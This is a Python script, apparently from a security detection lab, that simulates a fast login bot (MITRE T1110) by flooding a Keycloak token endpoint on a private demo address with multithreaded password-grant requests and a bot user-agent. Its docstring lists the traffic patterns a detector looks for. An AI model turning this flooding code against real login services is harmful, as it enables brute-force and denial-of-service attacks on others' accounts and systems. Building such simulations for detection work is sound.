"""
ATTAQUE : Login Bot rapide (T1110)
===================================
Simule un bot qui tente des logins à une cadence inhumaine
(>10 requêtes/seconde) pendant une courte période.

Pattern détectable :
  - n_events énorme sur une fenêtre courte
  - avg_interval_sec très faible (< 0.2s)
  - 1 seule IP source
  - User-Agent suspect ou répétitif

À distinguer de l'humain qui fait max 1 login toutes les 5-10 secondes.
"""
import sys, time, threading, requests

KEYCLOAK_URL = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.1.16:8080"
DURATION_SEC = int(sys.argv[2]) if len(sys.argv) > 2 else 30
N_THREADS    = int(sys.argv[3]) if len(sys.argv) > 3 else 5

REALM         = "sso-demo"
CLIENT_ID     = "ticket-app"
CLIENT_SECRET = "ticket-app-secret"

# User-agent typique de script (pas un navigateur)
BAD_UA = "python-requests/2.31.0 BotKit/1.0"

counter = {"sent": 0, "ok": 0}
lock = threading.Lock()
stop = threading.Event()


def hammer_worker(thread_id):
    """Chaque thread spam à fond."""
    url = f"{KEYCLOAK_URL}/realms/{REALM}/protocol/openid-connect/token"
    while not stop.is_set():
        try:
            r = requests.post(
                url,
                data={
                    "grant_type":   "password",
                    "client_id":    CLIENT_ID,
                    "client_secret":CLIENT_SECRET,
                    "username":     f"bot_user_{thread_id}",
                    "password":     "WrongPass!",
                },
                headers={"User-Agent": BAD_UA},
                timeout=10,
            )
            with lock:
                counter["sent"] += 1
                if r.status_code == 200:
                    counter["ok"] += 1
        except Exception:
            pass


print(f"[*] Bot rapide sur {KEYCLOAK_URL}")
print(f"[*] Durée : {DURATION_SEC}s, threads : {N_THREADS}\n")

threads = [threading.Thread(target=hammer_worker, args=(i,), daemon=True)
           for i in range(N_THREADS)]
for t in threads: t.start()

start = time.time()
while time.time() - start < DURATION_SEC:
    time.sleep(2)
    elapsed = time.time() - start
    with lock:
        rate = counter["sent"] / elapsed if elapsed > 0 else 0
        print(f"  [{elapsed:5.1f}s] envoyés={counter['sent']:5d} "
              f"({rate:5.1f} req/s)")

stop.set()
for t in threads: t.join(timeout=2)

print(f"\n[*] Total : {counter['sent']} requêtes en {DURATION_SEC}s")
print(f"[*] Cadence moyenne : {counter['sent']/DURATION_SEC:.1f} req/s")
